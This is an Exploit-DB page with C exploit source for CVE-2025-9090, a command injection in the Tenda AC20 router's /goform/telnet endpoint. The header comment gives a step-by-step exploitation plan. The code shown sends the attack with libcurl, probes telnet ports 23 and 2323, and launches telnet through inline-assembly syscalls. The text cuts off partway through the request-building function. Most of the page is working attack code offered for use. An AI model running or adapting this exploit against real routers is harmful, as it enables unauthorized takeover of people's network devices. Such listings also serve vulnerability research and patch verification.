---
title: [remote] Tenda AC20 16.03.08.12 - Command Injection
url: https://www.exploit-db.com/exploits/52418
source: Exploit-DB.com RSS Feed
date: 2025-08-19
fetch_date: 2025-10-07T00:16:07.475482
---

# [remote] Tenda AC20 16.03.08.12 - Command Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Tenda AC20 16.03.08.12 - Command Injection

#### EDB-ID:

###### 52418

#### CVE:

###### [2025-9090](https://nvd.nist.gov/vuln/detail/CVE-2025-9090)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-18

---

**Vulnerable App:**

```
/*
 * Exploit Title : Tenda AC20 16.03.08.12 - Command Injection
 * Author       : Byte Reaper
 * CVE          : CVE-2025-9090
 * Description:  A vulnerability was identified in Tenda AC20 16.03.08.12. Affected is the function websFormDefine of the file /goform/telnet of the component Telnet Service.
 * target endpoint : /goform/telnet
 * place in service : http://<IP>
 * full format target url : http://<IP>/goform/telnet
 * Exploitation plan:
 * 1. Build full URL
 * 2. Prepare POST data (Sleep + full url + libcurl function)
 * 3. Send POST request via CURL
 * 4. Measure response: HTTP code, telnet access (23), error word (not found)
 * 5. Determine success & finalize exploit
 */

#include <stdio.h>
#include "argparse.h"
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <errno.h>
#define MAX_RESPONSE (50 * 1024 * 1024)
#define URL 2400
#define BUFFER 4500
const char *ipT = NULL;
const char *cookies = NULL;
int loopF = 0;
int verbose = 0;
int fileCookies = 0;
void exit64bit()
{
	fflush(NULL);
	__asm__ volatile
	(
    "syscall\n\t"
    :
    : "A"(0x3C),
      "D"(0)
    : "rcx",
      "r11",
      "memory"
    );
    fflush(NULL);
}

struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr,
    size_t size,
    size_t nmemb,
    void *userdata)
{
	if (!userdata)
	{
		return 0;
	}
    if (size && nmemb > SIZE_MAX / size)
    {
        fprintf(stderr, "\e[0;31m[-] size * nmemb overflow !\e[0m\n");
        return 0;
    }
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    if (total > MAX_RESPONSE || (m->len + total + 1) > MAX_RESPONSE)
    {
        fprintf(stderr, "\e[0;31m[-] Response too large or would exceed MAX_RESPONSE !\e[0m\n");
        return 0;
    }
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exit64bit();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

int checkLen(int len, char *buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long.\e[0m\n");
        return 0;

    }
    return 0;
}

void cleanObject(CURL *c, struct curl_slist *h, char *r, size_t l)
{

	printf("\e[0;33m[+] Clean Headers...\e[0m\n");
	if (h != NULL)
    {
       	curl_slist_free_all(h);
    }
    if (c != NULL)
    {
    	curl_easy_cleanup(c);
    }
    printf("\e[0;33m[+] Clean CURL...\e[0m\n");
    if (r != NULL)
    {
    	free(r);
    	r = NULL;
    	l = 0;
    }
    printf("\e[0;33m[+] Clean response buffer and len...\e[0m\n");
    printf("\e[0;31m[+] Exit ....\n");
}
int sleepSocket()
{
	static int current = 2;
	int timeout = current;
	printf("\e[0;34m[+] Timeout Socket : %d\n", timeout);
	current++;
	if (current > 6)
	{
		current = 2;
	}
	return timeout;
}
int connectionTelnet(const char *ip)
{
	int ports[] =
	{
		23,
		2323
	};
	int num_ports = sizeof(ports) / sizeof(ports[0]);
	for (int i = 0; i < num_ports; i++)
	{
		printf("\e[0;36m[+] target PORT Connection telnet : %d\e[0m\n", ports[i]);
		printf("\e[0;36m[+] Try Connection in port : %d\e[0m\n", ports[i]);
		int s;
		char buffer[BUFFER];
		struct sockaddr_in server;
		s = socket(AF_INET, SOCK_STREAM, 0);
		if (s < 0)
		{
			perror("\e[0;31m[-] Error Create Socket !\e[0m\n");
			return -1;
		}
		server.sin_addr.s_addr = inet_addr(ip);
	    server.sin_family = AF_INET;
	    server.sin_port = htons(ports[i]);
	    struct timeval timeout;

	    int value3  = sleepSocket();
	    timeout.tv_sec = value3;
		timeout.tv_usec = 0;
	    if (setsockopt(s,
	    	SOL_SOCKET,
	    	SO_RCVTIMEO,
	    	(const char*)&timeout,
	    	sizeof(timeout)) < 0)
	    {
	    	perror("\e[0;31m[-] setsockopt() Failed !\e[0m\n");
	    	exit64bit();
	    }
	    printf("\e[0;33m[+] Timeout Connection socket ...\e[0m\n");

	    if (connect(s,
	    	(struct sockaddr *)&server,
	    	sizeof(server)) < 0)
	    {
	    	perror("\e[0;31m[-] Connect failed in Target Ip.\e[0m\n");
	    	close(s);
	    	continue;
	    }
	    printf("[+] Connection Success in server.\e[0m\n");
	    char banner[256];
		int n = recv(s,
			banner,
			sizeof(banner)-1,
			0);
		if (n > 0)
		{
		    banner[n] = '\0';
		    printf("\e[0;36m[+] Telnet Banner: %s\e[0m\n", banner);
		}

	    close(s);
	    if (verbose)
	    {
	    	printf("\e[0;33m[+] Close Socket...\e[0m\n");
	    }
	    return ports[i];
	}
    return -1;
}
int systemCommand(const char *ip)
{
	pid_t pid;
	printf("\e[0;37m[+] Before fork (PID : %d)\e[0m\n", getpid());
	pid = fork();
	if (pid < 0)
	{
		fprintf(stderr, "\e[0;31m[-] Fork failed !\e[0m\n");
		return 1;
	}
	else if (pid == 0)
	{
		int access[] = {23, 2323, 80};
		int numberAccess = sizeof(access) / sizeof(access[0]);
		for (int a = 0; a < numberAccess ; a++)
		{
			printf("\e[0;34m[+] child process (pid : %d)\e[0m\n", getpid());
			printf("\e[0;34m[+] sys_execve syscall...\e[0m\n");
			char ipS[90];

			int lenIp = snprintf(ipS, sizeof(ipS), "%s", ip);
			if (checkLen(lenIp,ipS,sizeof(ipS)) == 1)
			{
			    printf("\e[0;31m[-] Len Content (Target IP) is Long !\e[0m\n");
			    printf("\e[0;31m[-] Result Len (ip) : %d\e[0m\n",
			    	lenIp);
			    exit64bit();
			}
			char portsA[40];
			int lenA = snprintf(portsA, sizeof(portsA), "%d", access[a]);
			if (checkLen(lenA,portsA,sizeof(portsA)) == 1)
			{
			    printf("\e[0;31m[-] Len Content (Target port) is Long !\e[0m\n");
			    printf("\e[0;31m[-] Result Len (port) : %d\e[0m\n",
			    	lenA);
			    exit64bit();
			}
			const char *c = "/usr/bin/telnet";
	        char *const argv[] =
	        	{
	        		"telnet",
	        		ipS,
	        		portsA,
	        		NULL
	        	};

	        const char *envp[] = {NULL};
			__asm__ volatile
			(
				"mov $59, %%rax\n\t"
				"mov %[command], %%rdi\n\t"
				"mov %[v], %%rsi\n\t"
				"mov %[e], %%rdx\n\t"
				"syscall\n\t"
				:
				: [command] "r"(c),
				  [v] "r"(argv),
				  [e] "r" (envp)
				:"rax",
				 "rdi",
				 "rsi" ,
				 "rdx"
			);
			__asm__ volatile
			(
				"mov $0x3C, %%rax\n\t"
				"xor %%rdi, %%rdi\n\t"
				"syscall\n\t"
				:
				:
				:"rax",
				 "rdi"
			);
		}

	}
	else
	{
		waitpid(pid,
			NULL,
			0);
    	printf("\e[0;36m[+] Child process finished.\e[0m\n");
	}
	return 0;
}
void endPoint(const char *ip)
{
	CURL *curl = curl_easy_init();
	struct Mem response ;
	response.buffer = NULL;
	response.len = 0;
	struct curl_slist *headers = NULL;
	if (response.buffer == NULL && response.len == 0)
	{
		if (verbose)
		{
			printf("\e[0;35m==============================\e[0m\n");
			printf("\e[0;34m[+] Clean Response...\e[0m\n");
			printf("\e[0;34m[+] Response buffer is NULL.\e[0m\n");...